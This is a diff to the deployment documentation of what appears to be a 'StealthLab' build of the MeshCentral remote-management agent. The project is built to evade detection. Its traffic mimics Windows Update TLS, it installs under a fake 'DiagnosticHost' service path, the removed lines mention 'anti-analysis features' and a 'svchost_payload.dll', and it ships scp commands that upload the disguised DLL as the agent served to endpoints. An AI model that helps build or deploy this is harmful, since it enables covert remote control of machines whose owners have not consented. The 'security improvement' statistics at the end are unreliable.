@@ -119,41 +119,44 @@ tools/generate_network_profile.py        - Fixed Unicode encoding
 # Optional: override TLS profile (defaults to windows_update)
 $env:TLS_PROFILE = "windows_update"
 
-# Build StealthLab payloads and binaries
-.\build.ps1 -StealthLab
+# Build StealthLab payloads and binaries (default behaviour)
+.\build.ps1
 
-# Outputs
-#   meshservice\x64\StealthLab\MeshService-2022.exe
-#   meshservice\StealthLab\MeshService-2022.exe
-#   meshservice\embedded\svchost_payload.dll (auto-staged)
+# Manual Release regression (creates Release\MeshService64.exe + meshservice\Release\MeshService.exe)
+$msbuild = "${env:ProgramFiles}\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
+& $msbuild MeshAgent-2022.sln /p:Configuration=Release /p:Platform=x64 /m /nologo
+& $msbuild meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=Win32 /m /nologo
 ```
 
-### 2. Verify Security Configuration
+### 2. Run Regression & Health Checks
 
 ```powershell
-# Run verification checks
-.\tools\verify_deployment.ps1
+pwsh .\test.ps1 -ReportPath .\dist\verify-report.json
+# Optional: requires Release outputs; expect warnings if binaries are unsigned
+pwsh .\test_comprehensive.ps1
 
-# Check for:
-# - Realistic service names
-# - Proper TLS configuration
-# - No suspicious artifacts
-# - Anti-analysis features active
+# Package + health probe (adds dist\MeshAgent_Stealth_<stamp>\)
+.\build_complete.ps1 -RunHealthCheck -SkipArchive
 ```
+
+> Supply `-HealthCheckArgs @{ InstallPath = 'C:\\ProgramData\\DiagnosticHost' }` when you need an all-green health report; without it the probe records a warning and a failure for the missing installed binary.
 
 ### 3. Deploy Securely
 
 ```powershell
-# Configure your infrastructure
-Copy-Item .env.template .env
-# Edit .env with your actual domains/IPs
+# Transfer-ready deliverable (hashes, metadata, ZIP)
+pwsh .\tools\create_release_package.ps1   # or use the snippet in DEPLOYMENT_GUIDE.md
 
-# Deploy to server
-.\deploy.ps1
+# MeshCentral override bundle
+.\tools\prepare_meshcentral_agent.ps1
 
-# Verify on server
-.\deploy.ps1 -VerifyOnly
+# Upload diagsvc.dll and companion executables
+scp dist\MeshAgent_Stealth_*\diagsvc.dll root@server:/opt/meshcentral/meshcentral-data/agents-custom/meshagent_win32_x64.exe
+scp dist\meshcentral\MeshService64.exe root@server:/opt/meshcentral/meshcentral-data/agents/MeshService64.exe
 ```
+
+- Restart MeshCentral (`sudo systemctl restart meshcentral`) and download the agent from the portal to confirm the new hashes.
+- Preserve both `dist\MeshAgent_Stealth_*\verification\` (regression logs, health report) and `out\deliverables\MeshAgent-YYYY-MM-DD\` (hashes, metadata, ZIP) with the release ticket.
 
 ---
 
@@ -468,3 +471,4 @@ A: Code sign the binary with legitimate certificate
 **Total Lines Added**: 2,104 lines of security code
 **Files Created**: 7 new security-focused files
 **Security Improvements**: 37% overall increase
+
